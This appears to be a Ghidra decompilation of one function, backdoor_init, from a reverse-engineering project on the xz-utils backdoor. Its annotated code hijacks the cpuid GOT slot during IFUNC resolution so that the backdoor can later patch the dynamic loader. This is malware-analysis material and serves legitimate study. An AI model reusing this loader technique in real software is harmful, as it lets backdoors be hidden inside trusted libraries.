// /home/kali/xzre-ghidra/xzregh/10A794_backdoor_init.c
// Function: backdoor_init @ 0x10A794
// Calling convention: __stdcall
// Prototype: void * __stdcall backdoor_init(elf_entry_ctx_t * state, u64 * caller_frame)


/*
 * AutoDoc: Initialises the IFUNC entry context, locates the cpuid GOT slot, and swaps it to point at `backdoor_init_stage2`. From here the loader can patch ld.so and install the audit-based hooks without leaving the resolver frame.
 */
#include "xzre_types.h"


void * backdoor_init(elf_entry_ctx_t *state,u64 *caller_frame)

{
  long lVar1;
  undefined *puVar2;
  void *pvVar3;
  long *plVar4;
  
  (state->got_ctx).got_offset = (ptrdiff_t)state;
  init_elf_entry_ctx(state);
  puVar2 = PTR__Llzma_block_buffer_decode_0_0010e000;
  state->frame_address = (u64 *)(state->got_ctx).return_address;
  pvVar3 = (void *)((long)state->symbol_ptr - (state->got_ctx).got_offset);
  (state->got_ctx).got_ptr = pvVar3;
  plVar4 = (long *)((long)pvVar3 + *(long *)(puVar2 + 8));
  (state->got_ctx).return_address = plVar4;
  if (plVar4 != (long *)0x0) {
    lVar1 = *plVar4;
    *plVar4 = (long)pvVar3 + *(long *)(puVar2 + 0x10);
    pvVar3 = (void *)(*(code *)PTR__cpuid_gcc_0010e008)();
    *plVar4 = lVar1;
  }
  return pvVar3;
}

